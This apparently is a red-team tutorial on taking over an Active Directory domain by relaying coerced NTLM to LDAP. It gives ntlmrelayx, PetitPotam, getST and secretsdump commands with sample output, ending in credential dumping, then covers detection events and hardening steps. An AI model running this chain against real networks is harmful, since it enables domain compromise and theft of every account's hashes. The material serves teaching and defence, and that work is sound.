---
title: "NTLM Relay to LDAP: Domain Takeover"
description: "Using PetitPotam to coerce DC authentication and relay to LDAP for domain compromise via RBCD - full coverage of the LDAP-signing prerequisite, ntlmrelayx tooling, the post-relay RBCD chain, and the modern detection/mitigation landscape."
date: 2026-03-05
difficulty: Hard
tags: [ntlm, relay, ldap, petitpotam, active-directory]
---

## Why This Attack Still Lands

Coerced NTLM authentication relayed to LDAP has been the single most powerful AD primitive in red team engagements since 2021, and despite multiple Microsoft patches, the chain still works in a frightening percentage of real environments. The reason is a confluence of three weak defaults:

1. **NTLM is still enabled by default** for backwards compatibility.
2. **LDAP signing on the DC is still optional by default** until the org applies hardening guidance from Microsoft (the registry `LdapEnforceChannelBinding`/`LDAPServerIntegrity` keys default to "negotiate", not "require").
3. **Coercion primitives are abundant** - PetitPotam, PrintNightmare/PrinterBug, DFSCoerce, and several other RPC interfaces let any authenticated user (and sometimes anyone on the network) trigger an authentication from a DC's machine account to a host of the attacker's choosing.

Combine all three and a low-privilege user becomes Domain Admin in a matter of minutes.

## The Attack

Coerce a domain controller to authenticate via NTLM, relay those credentials to LDAP, and configure resource-based constrained delegation for domain takeover.

### High-Level Flow

```
   ┌────────────┐ 1. coerce NTLM via MS-EFSRPC                ┌────────────────┐
   │  Attacker  │────────────────────────────────────────────▶│ Domain         │
   │  (relay    │                                              │ Controller     │
   │   listener)│ 2. NTLM auth from DC01$                      │   DC01         │
   │            │◀─────────────────────────────────────────────│                │
   └─────┬──────┘                                              └────────────────┘
         │ 3. relay NTLM auth to DC02 LDAPS, channel: NEGOTIATE_SEAL
         ▼
   ┌────────────┐
   │  DC02      │ 4. accepts authenticated session as DC01$
   │  (LDAP/S)  │ 5. attacker sets msDS-AllowedToActOnBehalfOfOtherIdentity on DC01
   └────────────┘    granting access to a controlled machine account FAKE$
                  6. S4U as FAKE$ → TGS for cifs/dc01 as Administrator → DCSync
```

### Why LDAPS, Not LDAP

LDAP without TLS doesn't *negotiate* signing by default for NTLM relay (you can land an authenticated session even when LDAP signing is "negotiate"). LDAPS enforces channel binding only when EPA (Extended Protection for Authentication) is enabled - which is *not* the default until [ADV190023](https://learn.microsoft.com/en-us/security-updates/SecurityAdvisories/2019/ADV190023). On unhardened environments, you can relay either way.

In practice, ntlmrelayx tries LDAPS first (because it bypasses some signing requirements), falls back to LDAP if needed.

## Steps

1. Set up ntlmrelayx targeting DC02's LDAP with `--delegate-access`
2. Trigger PetitPotam against DC01 pointing to your listener
3. ntlmrelayx creates a machine account with RBCD rights over DC01
4. Use S4U to impersonate Administrator and DCSync

### Step 1 - Set up the relay listener

```bash
# ntlmrelayx - relay NTLM auth received over SMB/HTTP to LDAPS,
# create a machine account, and configure RBCD pointing to DC01$
ntlmrelayx.py \
    -t ldaps://dc02.corp.local \
    --delegate-access \
    --no-dump --no-da --no-acl \
    --escalate-user 'attacker_machine$'   # if you already have a machine acct
```

What `--delegate-access` does internally:

- After landing the LDAP authentication as `DC01$`, ntlmrelayx creates a new computer account (call it `WIN-XXXX$`) using the relayed session. (LDAP creating computer objects is allowed for any authenticated user up to `MachineAccountQuota`.)
- Modifies `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC01$` to include the SID of the newly-created machine account.
- Prints the credentials of the new machine account so you can use them in step 4.

If MAQ is 0 on the target domain, supply a machine account you already control via `--escalate-user`. The same RBCD chain works.

### Step 2 - Trigger PetitPotam

```bash
PetitPotam.py -d corp.local -u alice -p 'Pwd!' \
    attacker-ip dc01.corp.local
```

Options when PetitPotam doesn't work:

- **Unauthenticated PetitPotam** (older builds): omit `-d/-u/-p`.
- **PrintNightmare/PrinterBug**: `SpoolSample.exe dc01 attacker` - works if Spooler is running on DC (often is, regrettably).
- **DFSCoerce**: `dfscoerce.py -u alice -p 'Pwd!' -d corp.local attacker dc01` - works against MS-DFSNM.
- **Cert-based via ESC8**: relay to ADCS HTTP enrollment instead of LDAP - gets a DC certificate and you skip the RBCD step entirely.

### Step 3 - Watch the relay land

ntlmrelayx output:

```
[*] Servers started, waiting for connections
[*] Authenticating against ldaps://dc02.corp.local as CORP\DC01$ SUCCEED
[*] Domain Controller groups: ...
[*] Adding new computer with username: WIN-LF8N$ and password: f0Hz5iX...
[*] Adding User-Account-Control: 0x1000 to WIN-LF8N$
[*] WIN-LF8N$ added to msDS-AllowedToActOnBehalfOfOtherIdentity on DC01$
[*] Successfully delegated access from DC01$ via WIN-LF8N$
```

`WIN-LF8N$ / f0Hz5iX...` are the credentials of the new machine account; save them.

### Step 4 - S4U2Self + S4U2Proxy

```bash
getST.py -spn cifs/dc01.corp.local -impersonate Administrator \
    -dc-ip 10.0.0.1 corp.local/'WIN-LF8N$':'f0Hz5iX...'
# Output: Administrator.ccache
```

This succeeds because `WIN-LF8N$` has RBCD rights on `DC01$` (set in step 3). The resulting TGS authenticates as Administrator to `cifs/dc01`.

### Step 5 - DCSync

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.corp.local
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3b0c44...
```

You now have:
- `krbtgt`'s NT hash → mint Golden Tickets indefinitely.
- All user NT hashes → offline cracking + persistent access.
- Trust account hashes → cross-forest pivots.

## Why This Chain Breaks at Hardened Sites

| Defence | Effect on the chain |
|---|---|
| **LDAP signing enforced** (`LDAPServerIntegrity = 2` on DCs) | Step 1 fails because the relayed NTLM session can't sign the LDAP traffic. Mitigates LDAP relay entirely. |
| **EPA on LDAPS** (`LdapEnforceChannelBinding = 2`) | Step 1 fails on LDAPS for the same reason as above, with channel binding tokens. |
| **NTLM disabled domain-wide** | Step 1 has no NTLM session to relay - the coerced auth is Kerberos. |
| **`MachineAccountQuota = 0`** | Step 3 cannot create the new machine account. Workaround exists (use a machine account you already own). |
| **DCs added to Protected Users** | Machine accounts can't be Protected Users, but DCs being added to the group denies certain Kerberos protocol options. Marginal effect. |
| **`MS-DS-CreatorSID` denied write to RBCD** | Step 3 fails to set `msDS-AllowedToActOnBehalfOfOtherIdentity`. |
| **Patches for PetitPotam / PrintNightmare / DFSCoerce** | Step 2 alternative coercion primitives still exist; you must patch all of them. |
| **`RestrictReceivingNTLMTraffic`** | Blocks the inbound NTLM at the DC entirely. |

The realistic mitigation posture: **enforce LDAP signing + EPA + disable NTLM + patch coercion + MAQ 0 + Protected Users + audit RBCD modifications**. Each of these alone closes one corner; together they close the whole class.

## Detection

| Signal | Where |
|---|---|
| LDAP bind from a DC's machine account to a different DC | Event 4624 (Logon) on target DC with `WorkstationName` = source DC, `LogonType=3`, `LmPackageName=NTLM v2` |
| `MachineAccount` creation by a non-admin | Event 4741 (Computer Account Created) |
| Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` | Event 5136 with `AttributeName=msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Coercion RPC traffic to a DC | Network IDS rules for MS-EFSRPC, MS-RPRN, MS-DFSNM call patterns |
| Anomalous TGS-REQ for `cifs/<dc>` from a freshly-created machine account | DC Event 4769 immediately after a 4741 |

A SIEM correlation rule of "computer account created" + "msDS-AllowedToActOnBehalfOfOtherIdentity modified" + "TGS issued for the new account" inside a 5-minute window catches this attack reliably.

## Remediation

Enable LDAP signing and channel binding, disable NTLM where possible, patch MS-EFSRPC, enable EPA on AD CS endpoints.

Specific concrete steps (in order of impact):

1. **Enforce LDAP signing**: `Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'LDAPServerIntegrity' -Value 2 -Type DWord` on every DC. Reboot.
2. **Enforce LDAPS channel binding**: `Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'LdapEnforceChannelBinding' -Value 2 -Type DWord`.
3. **Patch MS-EFSRPC, MS-RPRN, MS-DFSNM** to current cumulative updates. Don't trust "we patched", verify CVE-2021-36942 (PetitPotam), CVE-2021-34527 (PrintNightmare), CVE-2022-26925 (PetitPotam variant), CVE-2022-26923 (Certifried).
4. **Disable NTLM domain-wide** where compatibility allows (`NetworkSecurity: Restrict NTLM` GPO settings).
5. **Set `MachineAccountQuota` to 0**: `Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"=0}`.
6. **Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` quarterly**: `Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' | Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }`.
7. **Add all privileged accounts to `Protected Users`** and set `NOT_DELEGATED` UAC flag.
8. **Enable EPA on ADCS Web Enrollment** (relevant if ADCS is exposed) - closes ESC8.
9. **SMB signing required everywhere** - closes adjacent SMB-relay variants of the same family.

> NTLM relay to LDAP for RBCD remains the cleanest, most reliable path from "any authenticated domain user" to "Domain Admin" in unhardened AD environments. The fix is not exotic - Microsoft has documented every step of the hardening guidance - but the operational cost of applying all of it is non-trivial, which is why the attack still lands. Every assessment I've done has either confirmed the chain works or proven the org has done the work to close it.
